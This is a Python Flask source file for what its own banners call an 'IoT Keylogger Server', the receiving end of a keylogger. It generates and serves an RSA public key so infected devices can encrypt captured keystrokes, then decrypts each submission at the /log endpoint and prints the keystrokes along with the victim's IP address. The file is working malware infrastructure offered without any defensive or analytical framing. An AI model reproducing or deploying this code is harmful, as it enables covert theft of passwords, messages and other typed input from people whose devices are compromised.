import os
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
import base64
import datetime
import colorama
from colorama import Fore, Style

# Initialize colorama for colored terminal output
colorama.init()

app = Flask(__name__)

# Generate or load RSA key pair
KEY_FILE = "private_key.pem"
PUBLIC_KEY_FILE = "public_key.pem"

if not os.path.exists(KEY_FILE):
    # Generate new key pair
    print(f"{Fore.YELLOW}Generating new RSA key pair...{Style.RESET_ALL}")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    
    # Save private key
    with open(KEY_FILE, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    
    # Save public key
    public_key = private_key.public_key()
    with open(PUBLIC_KEY_FILE, "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
    print(f"{Fore.GREEN}Key pair generated and saved.{Style.RESET_ALL}")
else:
    # Load existing key
    print(f"{Fore.YELLOW}Loading existing RSA key pair...{Style.RESET_ALL}")
    with open(KEY_FILE, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None
        )
    print(f"{Fore.GREEN}Key pair loaded.{Style.RESET_ALL}")

# Function to decrypt data with private key
def decrypt_data(encrypted_data):
    encrypted_bytes = base64.b64decode(encrypted_data)
    decrypted_bytes = private_key.decrypt(
        encrypted_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted_bytes.decode('utf-8')

# API endpoint to receive keystrokes
@app.route('/log', methods=['POST'])
def log_keystroke():
    if not request.is_json:
        print(f"{Fore.RED}Error: Invalid request format (not JSON){Style.RESET_ALL}")
        return jsonify({"error": "Invalid request format"}), 400
    
    data = request.json
    encrypted_keystrokes = data.get('data')
    
    if not encrypted_keystrokes:
        print(f"{Fore.RED}Error: No data provided in the request{Style.RESET_ALL}")
        return jsonify({"error": "No data provided"}), 400
    
    try:
        decrypted_keystrokes = decrypt_data(encrypted_keystrokes)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Display in terminal instead of saving to a file
        print(f"{Fore.CYAN}[{timestamp}]{Style.RESET_ALL} {Fore.WHITE}Keystrokes received:{Style.RESET_ALL} {Fore.GREEN}{decrypted_keystrokes}{Style.RESET_ALL}")
        
        client_ip = request.remote_addr
        print(f"{Fore.BLUE}Client IP: {client_ip}{Style.RESET_ALL}")
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"{Fore.RED}Error decrypting keystrokes: {str(e)}{Style.RESET_ALL}")
        return jsonify({"error": str(e)}), 500

# Endpoint to get the public key
@app.route('/public_key', methods=['GET'])
def get_public_key():
    with open(PUBLIC_KEY_FILE, "rb") as key_file:
        public_key_pem = key_file.read()
    print(f"{Fore.YELLOW}Public key requested by {request.remote_addr}{Style.RESET_ALL}")
    return public_key_pem

# Home endpoint
@app.route('/', methods=['GET'])
def home():
    return "IoT Keylogger Server is running"

if __name__ == "__main__":
    print(f"{Fore.MAGENTA}=============================================={Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}      IoT KEYLOGGER SERVER STARTED           {Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}=============================================={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Server listening on port 5000...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Connect to http://[this-ip]:5000/ to verify server is running{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Keystrokes will be displayed in this terminal window{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}=============================================={Style.RESET_ALL}")
    
    # Run on all interfaces, port 5000
    app.run(host='0.0.0.0', port=5000, debug=False)
